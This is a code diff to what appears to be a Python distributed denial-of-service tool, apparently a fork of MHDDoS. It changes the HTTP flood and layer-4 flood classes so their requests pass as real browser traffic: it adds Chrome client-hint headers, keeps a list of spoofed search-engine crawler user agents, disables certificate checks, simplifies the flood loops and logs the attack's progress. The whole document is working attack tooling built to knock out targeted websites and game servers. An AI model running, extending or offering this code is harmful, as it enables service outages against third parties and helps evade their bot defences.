@@ -47,14 +47,21 @@ logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
-# Enforce only TLSv1.2+ (defense-in-depth: also disable older protocols explicitly)
+
 if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
-# Disable insecure TLS versions for additional safety
-if hasattr(ssl, "OP_NO_TLSv1"):
-    ctx.options |= ssl.OP_NO_TLSv1
-if hasattr(ssl, "OP_NO_TLSv1_1"):
-    ctx.options |= ssl.OP_NO_TLSv1_1
+else:
+    import warnings
+    with warnings.catch_warnings():
+        warnings.simplefilter("ignore", DeprecationWarning)
+        if hasattr(ssl, "OP_NO_SSLv2"):
+            ctx.options |= ssl.OP_NO_SSLv2
+        if hasattr(ssl, "OP_NO_SSLv3"):
+            ctx.options |= ssl.OP_NO_SSLv3
+        if hasattr(ssl, "OP_NO_TLSv1"):
+            ctx.options |= ssl.OP_NO_TLSv1
+        if hasattr(ssl, "OP_NO_TLSv1_1"):
+            ctx.options |= ssl.OP_NO_TLSv1_1
 
 __version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
@@ -135,7 +142,6 @@ class Methods:
 
 
 search_engine_agents = [
-    # ---------------- Google ----------------
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
     "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
@@ -148,51 +154,29 @@ search_engine_agents = [
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
     "Mediapartners-Google",
     "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
-
-    # ---------------- Bing / Microsoft ----------------
     "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
     "BingPreview/1.0b",
     "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
-
-    # ---------------- Yahoo ----------------
     "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
     "Yahoo! Slurp China",
-
-    # ---------------- Yandex ----------------
     "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
     "YandexMobileBot/3.0 (+http://yandex.com/bots)",
     "YandexImages/3.0 (+http://yandex.com/bots)",
     "YandexVideo/3.0 (+http://yandex.com/bots)",
     "YandexNews/3.0 (+http://yandex.com/bots)",
-
-    # ---------------- Baidu ----------------
     "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
     "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
     "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
-
-    # ---------------- DuckDuckGo ----------------
     "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
     "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
-
-    # ---------------- Applebot ----------------
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
     "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
     "+http://www.apple.com/go/applebot)",
-
-    # ---------------- Facebook / Social ----------------
     "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
     "Facebot/1.0",
-
-    # ---------------- Twitter ----------------
     "Twitterbot/1.0",
-
-    # ---------------- LinkedIn ----------------
     "LinkedInBot/1.0 (+https://www.linkedin.com/)",
-
-    # ---------------- Pinterest ----------------
     "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
-
-    # ---------------- Other Major Bots ----------------
     "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
     "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
     "MJ12bot/v1.4.8 (http://mj12bot.com/)",
@@ -426,7 +410,6 @@ class Minecraft:
                               Minecraft.data(message.encode()))
 
 
-# noinspection PyBroadException,PyUnusedLocal
 class Layer4(Thread):
     _method: str
     _target: Tuple[str, int]
@@ -473,59 +456,8 @@ class Layer4(Thread):
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
-        
-        if self._proxies:
-            global threads
-            proxy_list = self._proxies
-            total_proxies = len(proxy_list)
-            
-            # Only use proxies if this thread has any assigned
-            if total_proxies > 0 and threads > 0:
-                # Calculate distribution - ensure at least 1 proxy per thread that gets proxies
-                if threads >= total_proxies:
-                    # More threads than proxies: only some threads get 1 proxy each
-                    if self._thread_id < total_proxies:
-                        my_proxies = [proxy_list[self._thread_id]]
-                    else:
-                        # This thread gets no proxies, run without them
-                        my_proxies = []
-                else:
-                    # More proxies than threads: distribute evenly
-                    proxies_per_thread = total_proxies // threads
-                    remainder = total_proxies % threads
-                    
-                    # Calculate this thread's slice
-                    if self._thread_id < remainder:
-                        # First 'remainder' threads get one extra proxy
-                        start_idx = self._thread_id * (proxies_per_thread + 1)
-                        end_idx = start_idx + proxies_per_thread + 1
-                    else:
-                        # Remaining threads get normal amount
-                        start_idx = remainder * (proxies_per_thread + 1) + (self._thread_id - remainder) * proxies_per_thread
-                        end_idx = start_idx + proxies_per_thread
-                    
-                    my_proxies = proxy_list[start_idx:end_idx]
-                
-                # Only create executor if we have proxies
-                if my_proxies:
-                    with ThreadPoolExecutor(max_workers=len(my_proxies)) as executor:
-                        while self._synevent.is_set():
-                            futures = [executor.submit(self.SENT_FLOOD) for _ in my_proxies]
-                            for future in as_completed(futures):
-                                with suppress(Exception):
-                                    future.result()
-                else:
-                    # No proxies assigned, run single-threaded without proxies
-                    while self._synevent.is_set():
-                        self.SENT_FLOOD()
-            else:
-                # No proxies at all, run normally
-                while self._synevent.is_set():
-                    self.SENT_FLOOD()
-        else:
-            # No proxy list provided
-            while self._synevent.is_set():
-                self.SENT_FLOOD()
+        while self._synevent.is_set():
+            self.SENT_FLOOD()
 
     def open_connection(self,
                         conn_type=AF_INET,
@@ -653,13 +585,11 @@ class Layer4(Thread):
     def FIVEMTOKEN(self) -> None:
         global BYTES_SEND, REQUESTS_SENT
 
-        # Generate token and guid
         token = str(uuid4())
         steamid_min = 76561197960265728
         steamid_max = 76561199999999999
         guid = str(randint(steamid_min, steamid_max))
 
-        # Build Payload
         payload_str = f"token={token}&guid={guid}"
         payload = payload_str.encode('utf-8')
 
@@ -816,7 +746,6 @@ class Layer4(Thread):
                 self._amp_payloads = cycle(self._generate_amp())
 
 
-# noinspection PyBroadException,PyUnusedLocal
 class HttpFlood(Thread):
     _proxies: Any = None
     _payload: str
@@ -935,16 +864,18 @@ class HttpFlood(Thread):
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                       target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
         self._payload = (self._defaultpayload +
-                         'Accept-Encoding: gzip, deflate, br\r\n'
-                         'Accept-Language: en-US,en;q=0.9\r\n'
+                         'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n'
+                         'Accept-Encoding: gzip, deflate, br, zstd\r\n'
+                         'Accept-Language: en-US,en;q=0.9,es;q=0.8\r\n'
                          'Cache-Control: max-age=0\r\n'
                          'Connection: keep-alive\r\n'
+                         'Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"\r\n'
+                         'Sec-Ch-Ua-Mobile: ?0\r\n'
+                         'Sec-Ch-Ua-Platform: "Windows"\r\n'
                          'Sec-Fetch-Dest: document\r\n'
                          'Sec-Fetch-Mode: navigate\r\n'
                          'Sec-Fetch-Site: none\r\n'
                          'Sec-Fetch-User: ?1\r\n'
-                         'Sec-Gpc: 1\r\n'
-                         'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
 
     def select(self, name: str) -> None:
@@ -956,59 +887,8 @@ class HttpFlood(Thread):
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
-        
-        if self._proxies:
-            global threads
-            proxy_list = self._proxies
-            total_proxies = len(proxy_list)
-            
-            # Only use proxies if this thread has any assigned
-            if total_proxies > 0 and threads > 0:
-                # Calculate distribution - ensure at least 1 proxy per thread that gets proxies
-                if threads >= total_proxies:
-                    # More threads than proxies: only some threads get 1 proxy each
-                    if self._thread_id < total_proxies:
-                        my_proxies = [proxy_list[self._thread_id]]
-                    else:
-                        # This thread gets no proxies, run without them
-                        my_proxies = []
-                else:
-                    # More proxies than threads: distribute evenly
-                    proxies_per_thread = total_proxies // threads
-                    remainder = total_proxies % threads
-                    
-                    # Calculate this thread's slice
-                    if self._thread_id < remainder:
-                        # First 'remainder' threads get one extra proxy
-                        start_idx = self._thread_id * (proxies_per_thread + 1)
-                        end_idx = start_idx + proxies_per_thread + 1
-                    else:
-                        # Remaining threads get normal amount
-                        start_idx = remainder * (proxies_per_thread + 1) + (self._thread_id - remainder) * proxies_per_thread
-                        end_idx = start_idx + proxies_per_thread
-                    
-                    my_proxies = proxy_list[start_idx:end_idx]
-                
-                # Only create executor if we have proxies
-                if my_proxies:
-                    with ThreadPoolExecutor(max_workers=len(my_proxies)) as executor:
-                        while self._synevent.is_set():
-                            futures = [executor.submit(self.SENT_FLOOD) for _ in my_proxies]
-                            for future in as_completed(futures):
-                                with suppress(Exception):
-                                    future.result()
-                else:
-                    # No proxies assigned, run single-threaded without proxies
-                    while self._synevent.is_set():
-                        self.SENT_FLOOD()
-            else:
-                # No proxies at all, run normally
-                while self._synevent.is_set():
-                    self.SENT_FLOOD()
-        else:
-            # No proxy list provided
-            while self._synevent.is_set():
-                self.SENT_FLOOD()
+        while self._synevent.is_set():
+            self.SENT_FLOOD()
 
     @property
     def SpoofIP(self) -> str:
@@ -1114,7 +994,7 @@ class HttpFlood(Thread):
 
     def APACHE(self) -> None:
         payload: bytes = self.generate_payload(
-            "Range: bytes=0-,%s" % ",".join("5-%d" % i
+            "Range: bytes=0-,%s\r\n" % ",".join("5-%d" % i
                                             for i in range(1, 1024)))
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -1325,16 +1205,18 @@ class HttpFlood(Thread):
                                                            ProxyTools.Random.rand_str(6)) +
                              "Host: %s\r\n" % self._target.authority +
                              self.randHeadercontent +
-                             'Accept-Encoding: gzip, deflate, br\r\n'
+                             'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n'
+                             'Accept-Encoding: gzip, deflate, br, zstd\r\n'
                              'Accept-Language: en-US,en;q=0.9\r\n'
                              'Cache-Control: max-age=0\r\n'
                              'Connection: Keep-Alive\r\n'
+                             'Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24"\r\n'
+                             'Sec-Ch-Ua-Mobile: ?0\r\n'
+                             'Sec-Ch-Ua-Platform: "Windows"\r\n'
                              'Sec-Fetch-Dest: document\r\n'
                              'Sec-Fetch-Mode: navigate\r\n'
                              'Sec-Fetch-Site: none\r\n'
                              'Sec-Fetch-User: ?1\r\n'
-                             'Sec-Gpc: 1\r\n'
-                             'Pragma: no-cache\r\n'
                              'Upgrade-Insecure-Requests: 1\r\n\r\n')
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -1346,16 +1228,18 @@ class HttpFlood(Thread):
                                                         randhex) +
                              "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                              self.randHeadercontent +
-                             'Accept-Encoding: gzip, deflate, br\r\n'
+                             'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n'
+                             'Accept-Encoding: gzip, deflate, br, zstd\r\n'
                              'Accept-Language: en-US,en;q=0.9\r\n'
                              'Cache-Control: max-age=0\r\n'
                              'Connection: keep-alive\r\n'
+                             'Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24"\r\n'
+                             'Sec-Ch-Ua-Mobile: ?0\r\n'
+                             'Sec-Ch-Ua-Platform: "Windows"\r\n'
                              'Sec-Fetch-Dest: document\r\n'
                              'Sec-Fetch-Mode: navigate\r\n'
                              'Sec-Fetch-Site: none\r\n'
                              'Sec-Fetch-User: ?1\r\n'
-                             'Sec-Gpc: 1\r\n'
-                             'Pragma: no-cache\r\n'
                              'Upgrade-Insecure-Requests: 1\r\n\r\n')
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -1364,16 +1248,18 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def STOMP(self):
-        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
+        dep = ('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n'
+               'Accept-Encoding: gzip, deflate, br, zstd\r\n'
                'Accept-Language: en-US,en;q=0.9\r\n'
                'Cache-Control: max-age=0\r\n'
                'Connection: keep-alive\r\n'
+               'Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24"\r\n'
+               'Sec-Ch-Ua-Mobile: ?0\r\n'
+               'Sec-Ch-Ua-Platform: "Windows"\r\n'
                'Sec-Fetch-Dest: document\r\n'
                'Sec-Fetch-Mode: navigate\r\n'
                'Sec-Fetch-Site: none\r\n'
                'Sec-Fetch-User: ?1\r\n'
-               'Sec-Gpc: 1\r\n'
-               'Pragma: no-cache\r\n'
                'Upgrade-Insecure-Requests: 1\r\n\r\n')
         hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
                r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
@@ -1699,7 +1585,6 @@ class ToolsConsole:
                len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                argv[0], argv[0], argv[0], argv[0]))
 
-    # noinspection PyBroadException
     @staticmethod
     def ts_srv(domain):
         records = ['_ts3._udp.', '_tsdns._tcp.']
@@ -1718,7 +1603,6 @@ class ToolsConsole:
 
         return Info
 
-    # noinspection PyUnreachableCode
     @staticmethod
     def info(domain):
         with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
@@ -1768,19 +1652,12 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
 if __name__ == '__main__':
     def signal_handler(sig, frame):
-        """Handle Ctrl+C gracefully"""
         print("\n")
-        logger.info("Received interrupt signal. Shutting down gracefully...")
-        logger.info("Stopping all attack threads...")
-        if 'event' in globals() and event:
-            event.clear()
-        sleep(2)  # Give threads time to stop
-        logger.info("Attack stopped successfully. Goodbye!")
+        logger.info("Shutting down...")
         _exit(0)
     
-    # Register signal handler for Ctrl+C
-    import signal
     signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
     
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
@@ -1945,27 +1822,19 @@ if __name__ == '__main__':
                            proxies, protocolid).start()
 
             logger.info(
-                f"Attack started on {target or url.host} with {method} method for {timer} seconds, threads: {threads}")
-            logger.info("Press Ctrl+C to stop the attack gracefully")
+                f"Attack started on {target or url.host} with {method} method for {timer} seconds")
             event.set()
             ts = time()
             
-            try:
-                while time() < ts + timer:
-                    logger.debug(
-                        f'Target: {target or url.host}, Port: {port or (url.port or 80)}, Method: {method}, PPS: {Tools.humanformat(int(REQUESTS_SENT))}, BPS: {Tools.humanbytes(int(BYTES_SEND))} / {round((time() - ts) / timer * 100, 2)}%')
-                    REQUESTS_SENT.set(0)
-                    BYTES_SEND.set(0)
-                    sleep(1)
-            except KeyboardInterrupt:
-                signal_handler(None, None)
+            while time() < ts + timer:
+                logger.debug(
+                    f'Target: {target or url.host} | Method: {method} | PPS: {Tools.humanformat(int(REQUESTS_SENT))} | BPS: {Tools.humanbytes(int(BYTES_SEND))} | Progress: {round((time() - ts) / timer * 100, 2)}%')
+                REQUESTS_SENT.set(0)
+                BYTES_SEND.set(0)
+                sleep(1)
 
-            # Attack completed normally
-            logger.info("Attack duration completed!")
-            logger.info("Stopping all threads...")
             event.clear()
-            sleep(2)
-            logger.info("Attack finished successfully. Goodbye!")
-            exit()
+            logger.info("Attack finished!")
+            _exit(0)
 
         ToolsConsole.usage()
